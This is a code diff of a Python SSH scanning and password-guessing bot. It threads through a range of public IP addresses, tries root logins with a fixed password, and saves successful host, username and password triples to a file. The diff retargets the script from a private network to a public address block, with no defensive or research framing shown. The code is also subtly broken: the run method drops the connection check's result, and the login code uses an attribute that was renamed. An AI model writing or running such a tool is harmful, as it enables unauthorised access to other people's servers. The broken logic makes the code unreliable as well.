@@ -3,52 +3,60 @@
 
 import socket
 import paramiko
+import threading
 
 
+# Saving valid resources in the file
 def save_data(data):
     with open("valid.txt", "a") as f:
         f.write(data)
 
 
-class Bot(object):
-    def __init__(self, start_ip, end_ip, port, username, password):
-        self.start_ip = start_ip
-        self.end_ip = end_ip
+# Generating ip list from ip range
+def generate_hosts(start_ip, end_ip):
+    start = list(map(int, start_ip.split(".")))
+    end = list(map(int, end_ip.split(".")))
+    temp = start
+    ip_range = []
+
+    ip_range.append(start_ip)
+    while temp != end:
+        start[3] += 1
+        for i in (3, 2, 1):
+            if temp[i] == 256:
+                temp[i] = 0
+                temp[i - 1] += 1
+        ip_range.append(".".join(map(str, temp)))
+
+    return ip_range
+
+
+# Running check to open port and start threads
+class Worker(threading.Thread):
+    def __init__(self, ip, port, username, password):
+        threading.Thread.__init__(self)
+        self.ip = ip
         self.port = port
         self.username = username
         self.password = password
 
-    def generate_hosts(self):
-        start = list(map(int, self.start_ip.split(".")))
-        end = list(map(int, self.end_ip.split(".")))
-        temp = start
-        ip_range = []
-
-        ip_range.append(self.start_ip)
-        while temp != end:
-            start[3] += 1
-            for i in (3, 2, 1):
-                if temp[i] == 256:
-                    temp[i] = 0
-                    temp[i - 1] += 1
-            ip_range.append(".".join(map(str, temp)))
-
-        return ip_range
+    def run(self):
+        self.check_connect()
 
     def check_connect(self):
         try:
             cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            cli.settimeout(10)
-            cli.connect((self.host, self.port))
+            cli.settimeout(5)
+            cli.connect((self.ip, self.port))
             banner = cli.recv(1024)
-            print("[INFO] %s\t%s"% (self.host, banner))
-            return True
+            print("[INFO] %s\t%s"% (self.ip, banner))
+            return self.ip
         except Exception as e:
-            print("[ERROR] Connection is %s"% e)
-            return False
+            pass
 
 
-class Ssh(Bot):
+# Trying ssh connection with login password
+class Ssh(Worker):
     def login(self):
         try:
             ssh_cli = paramiko.SSHClient()
@@ -57,25 +65,18 @@ class Ssh(Bot):
             save_data("%s:%s:%s"% (self.host, self.username, self.password))
             ssh_cli.close()
         except Exception as e:
-            print("[ERROR] Authentication is %s"% e)
+            ssh_cli.close()
 
     def run(self):
-        ip_range = self.generate_hosts()
-        for host in ip_range:
-            print(host)
-
-
-class Telnet(Bot, Ssh):
-    pass
-
-
-class Rdp(Bot):
-    pass
+        if Worker.run(self):
+            print(Worker.run(self))
 
 
 def main():
-    bot = Ssh("192.168.1.1", "192.168.1.254", 22, "root", "p@ssw0rd")
-    bot.run()
+    ip_range = generate_hosts("65.39.60.1", "65.39.64.254")
+    for ip in ip_range:
+        bot = Ssh(ip, 22, "root", "p@$$w0rd")
+        bot.start()
 
 
 if __name__ == '__main__':
